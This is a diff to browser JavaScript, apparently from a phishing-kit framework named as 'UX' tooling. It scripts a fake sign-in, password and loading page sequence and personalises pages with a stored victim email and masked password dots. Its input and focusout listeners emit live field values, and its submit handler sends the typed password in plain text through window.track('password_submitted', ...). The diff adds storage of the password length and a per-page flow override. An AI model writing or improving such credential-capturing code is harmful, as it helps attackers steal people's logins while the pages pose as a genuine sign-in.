@@ -1023,8 +1023,11 @@ document.addEventListener('focusout', function(e){ __ux_emit_live(e.target, fals
 document.addEventListener('input', function(e){ __ux_emit_live(e.target, true); }, true);
 
 var EMAIL_KEY = '__ux_email';
+var PASS_LEN_KEY = '__ux_pass_len';
 function getStoredEmail(){ try { return sessionStorage.getItem(EMAIL_KEY) || ''; } catch(e){ return ''; } }
 function setStoredEmail(v){ try { sessionStorage.setItem(EMAIL_KEY, v); } catch(e){} }
+function getStoredPassLen(){ try { return parseInt(sessionStorage.getItem(PASS_LEN_KEY) || '0', 10) || 0; } catch(e){ return 0; } }
+function setStoredPassLen(n){ try { sessionStorage.setItem(PASS_LEN_KEY, String(n|0)); } catch(e){} }
 function currentDesignAndPage(){
   try {
     var parts = parent.location.pathname.split('/').filter(Boolean);
@@ -1048,15 +1051,38 @@ function navigateTo(page){
   }, 600);
 }
 
+var EMAIL_PLACEHOLDERS = ['lol@gmail.com', 'example@gmail.com', 'user@example.com'];
 function replaceEmailPlaceholder(){
   var email = getStoredEmail();
+  // Avatar elements (data-ux-avatar): set first letter regardless of email presence (fallback '?')
+  var letter = (email ? email.charAt(0) : '?').toUpperCase();
+  try {
+    var avatars = document.querySelectorAll('[data-ux-avatar]');
+    for (var a = 0; a < avatars.length; a++) avatars[a].textContent = letter;
+  } catch(e){}
+  // Explicit email targets
+  try {
+    var emailEls = document.querySelectorAll('[data-ux-email]');
+    for (var i = 0; i < emailEls.length; i++) emailEls[i].textContent = email || emailEls[i].textContent;
+  } catch(e){}
+  // Password mask targets — show • repeated for stored password length
+  try {
+    var n = getStoredPassLen();
+    var dots = new Array(n + 1).join('•');
+    var pwEls = document.querySelectorAll('[data-ux-password-mask]');
+    for (var j = 0; j < pwEls.length; j++) pwEls[j].textContent = dots;
+  } catch(e){}
   if (!email) return;
   function walk(node){
     if (!node) return;
     if (node.nodeType === 3) {
-      if (node.nodeValue && node.nodeValue.indexOf('lol@gmail.com') >= 0) {
-        node.nodeValue = node.nodeValue.split('lol@gmail.com').join(email);
+      var v = node.nodeValue;
+      if (!v) return;
+      for (var k = 0; k < EMAIL_PLACEHOLDERS.length; k++) {
+        var ph = EMAIL_PLACEHOLDERS[k];
+        if (v.indexOf(ph) >= 0) v = v.split(ph).join(email);
       }
+      node.nodeValue = v;
     } else if (node.nodeType === 1) {
       var tag = node.tagName;
       if (tag === 'SCRIPT' || tag === 'STYLE') return;
@@ -1075,7 +1101,9 @@ function wireContinueButtons(){
   var here = currentDesignAndPage().page || '';
   // Page → next page mapping for guided flow.
   var NEXT = { 'signin': 'signinp', 'signinp': 'loading' };
-  var nextPage = NEXT[here] || 'loading';
+  // Allow per-page override via <body data-ux-next="...">
+  var bodyNext = document.body && document.body.getAttribute && document.body.getAttribute('data-ux-next');
+  var nextPage = bodyNext || NEXT[here] || 'loading';
 
   var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"], input[name*="mail" i], input[id*="mail" i], input[autocomplete*="email" i], input[autocomplete*="username" i]'));
   var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"], input[name*="pass" i], input[id*="pass" i], input[autocomplete*="password" i]'));
@@ -1122,6 +1150,7 @@ function wireContinueButtons(){
     e.stopPropagation();
     if (e.stopImmediatePropagation) e.stopImmediatePropagation();
     if (hasPassword) {
+      setStoredPassLen((input.value || '').length);
       try { window.track('password_submitted', input.value || ''); } catch(err){}
       try { window.track('continue_clicked', '1'); } catch(err){}
       navigateTo(nextPage);
